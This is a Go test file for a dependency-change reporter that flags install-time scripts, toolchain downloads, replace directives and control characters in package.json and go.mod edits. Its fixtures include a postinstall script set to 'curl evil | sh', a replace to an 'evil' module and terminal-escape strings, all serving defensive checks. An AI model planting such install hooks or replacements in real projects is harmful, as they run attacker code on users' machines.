package deps

import (
	"slices"
	"strings"
	"testing"
)

func TestIsManifest(t *testing.T) {
	for file, want := range map[string]bool{
		"package.json": true, "web/package.json": true, "go.mod": true, "tools/go.mod": true,
		"package-lock.json": false, "go.sum": false, "Makefile": false,
	} {
		if got := IsManifest(file); got != want {
			t.Errorf("IsManifest(%q) = %v, want %v", file, got, want)
		}
	}
}

func TestPackageChanges(t *testing.T) {
	before := `{
  "name": "app",
  "dependencies": {"react": "^18.0.0", "lodash": "^4.0.0"},
  "devDependencies": {"vitest": "^1.0.0"},
  "scripts": {"build": "vite build", "postinstall": "node setup.js"}
}`
	after := `{
  "name": "renamed",
  "dependencies": {"react": "^19.0.0"},
  "devDependencies": {"vitest": "^1.0.0", "wrangler": "^4.0.0"},
  "peerDependencies": {"vue": "3"},
  "scripts": {"build": "vite build", "postinstall": "curl evil | sh", "prepare": "husky", "lint": "eslint ."}
}`
	got, err := ManifestChanges("web/package.json", []byte(before), []byte(after))
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"dependencies: removed lodash ^4.0.0",
		`dependencies: changed react: ^18.0.0 -> ^19.0.0`,
		"devDependencies: added wrangler ^4.0.0",
		"peerDependencies: added vue 3",
		`scripts: added lint "eslint ."`,
		`scripts: changed postinstall (runs on install): "node setup.js" -> "curl evil | sh"`,
		`scripts: added prepare (runs on install) husky`,
	}
	if !slices.Equal(got, want) {
		t.Errorf("changes\n got %q\nwant %q", got, want)
	}
}

func TestPackageChangesNone(t *testing.T) {
	got, err := ManifestChanges("package.json", []byte(`{"name":"a"}`), []byte(`{"name":"b","version":"2"}`))
	if err != nil || len(got) != 0 {
		t.Errorf("changes = %q, %v; want none", got, err)
	}
}

func TestManifestChangesUnparseable(t *testing.T) {
	good := []byte(`{"dependencies":{}}`)
	for name, c := range map[string][2]string{
		"before broken": {`{`, string(good)},
		"after broken":  {string(good), `{"dependencies": [`},
		"wrong type":    {string(good), `{"dependencies": {"x": 1}}`},
		"go.mod broken": {"module a\n", "module a\nrequire (\n"},
	} {
		file := "package.json"
		if strings.HasPrefix(name, "go.mod") {
			file = "go.mod"
		}
		if _, err := ManifestChanges(file, []byte(c[0]), []byte(c[1])); err == nil {
			t.Errorf("%s: no error", name)
		}
	}
}

// TestManifestChangesEscapes checks that control characters and long values
// from an agent-written file are escaped and cut.
func TestManifestChangesEscapes(t *testing.T) {
	long := strings.Repeat("a", 500)
	rlo := string(rune(0x202e))
	after := `{"devDependencies": {"evil\u001b]8;;x\u0007": "1"}, "scripts": {"postinstall": "` + long + `", "x": "` + rlo + `hidden"}}`
	got, err := ManifestChanges("package.json", []byte(`{}`), []byte(after))
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(got, "\n")
	if strings.ContainsAny(joined, "\x1b\x07"+rlo) {
		t.Errorf("control characters written raw: %q", joined)
	}
	for _, want := range []string{`"evil\x1b]8;;x\a"`, `"` + `\` + `u202ehidden"`, `"` + strings.Repeat("a", maxValue) + `"...`} {
		if !strings.Contains(joined, want) {
			t.Errorf("changes %q lack %q", joined, want)
		}
	}
}

func TestGoModChanges(t *testing.T) {
	before := `module example.com/app

go 1.22

require (
	github.com/a/one v1.0.0
	github.com/b/two v1.2.0
)

replace github.com/a/one => ../one
`
	after := `module example.com/app

go 1.23

toolchain go1.23.4

require (
	github.com/a/one v1.1.0
	github.com/c/three v0.1.0
)

replace github.com/a/one v1.1.0 => github.com/evil/one v1.1.0

tool github.com/c/three/cmd/gen
`
	got, err := ManifestChanges("go.mod", []byte(before), []byte(after))
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"changed go (go may download and run this toolchain): 1.22 -> 1.23",
		"added toolchain (go may download and run this toolchain) go1.23.4",
		"require: changed github.com/a/one: v1.0.0 -> v1.1.0",
		"require: removed github.com/b/two v1.2.0",
		"require: added github.com/c/three v0.1.0",
		"replace: removed github.com/a/one ../one",
		`replace: added "github.com/a/one v1.1.0" "github.com/evil/one v1.1.0"`,
		"tool: added github.com/c/three/cmd/gen (go tool runs it)",
	}
	if !slices.Equal(got, want) {
		t.Errorf("changes\n got %q\nwant %q", got, want)
	}
}
